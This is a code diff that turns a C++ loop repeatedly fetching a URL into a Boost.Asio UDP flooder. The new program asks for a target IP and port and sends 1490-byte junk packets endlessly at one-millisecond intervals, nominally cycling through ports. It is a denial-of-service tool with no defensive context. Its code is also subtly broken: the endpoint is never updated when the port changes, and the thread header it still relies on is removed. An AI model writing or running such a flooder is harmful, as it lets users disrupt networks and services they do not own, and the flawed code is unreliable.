@@ -1,44 +1,41 @@
 #include <iostream>
-#include <curl/curl.h>
-#include <thread>
+#include <boost/asio.hpp>
 
 using namespace std;
 
+using boost::asio::ip::udp;
+
 int main() {
-    CURL *curl;
-    CURLcode res;
-    string url;
-    int times;
+    boost::asio::io_service io_service;
+    udp::socket socket(io_service);
+    udp::endpoint remote_endpoint;
 
-    cout << "Enter the URL: ";
-    cin >> url;
-    cout << "Enter the number of times to send: ";
-    cin >> times;
+    socket.open(udp::v4());
 
-    curl_global_init(CURL_GLOBAL_DEFAULT);
-    curl = curl_easy_init();
+    std::string target_ip;
+    int target_port;
+    std::cout << "IP Target: ";
+    std::cin >> target_ip;
+    std::cout << "Port: ";
+    std::cin >> target_port;
 
-    if(curl) {
-        while(true) {
-            for(int i = 0; i < times; i++){
-                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-                res = curl_easy_perform(curl);
-                if(res == CURLE_OK) {
-                    cout << "Successfully connected to the website." << endl;
-                } else {
-                    cout << "Failed to connect to the website: " << curl_easy_strerror(res) << endl;
-                }
-                this_thread::sleep_for(chrono::seconds(1));
-            }
-            if(res != CURLE_OK) {
-                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-            }
+    remote_endpoint = udp::endpoint(boost::asio::ip::address::from_string(target_ip), target_port);
+
+    std::string message(1490, 'A'); // A string of 1490 'A's
+
+    while (true) {
+        socket.send_to(boost::asio::buffer(message), remote_endpoint);
+        cout << "Sent " << message.size() << " bytes to " << remote_endpoint << endl;
+
+        if (target_port == 65534) {
+            target_port = 1;
+        } else {
+            ++target_port;
         }
 
-        curl_easy_cleanup(curl);
-    }
-
-    curl_global_cleanup();
+        // Sleep for 1 millisecond
+        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+    } // Add this closing brace
 
     return 0;
 }
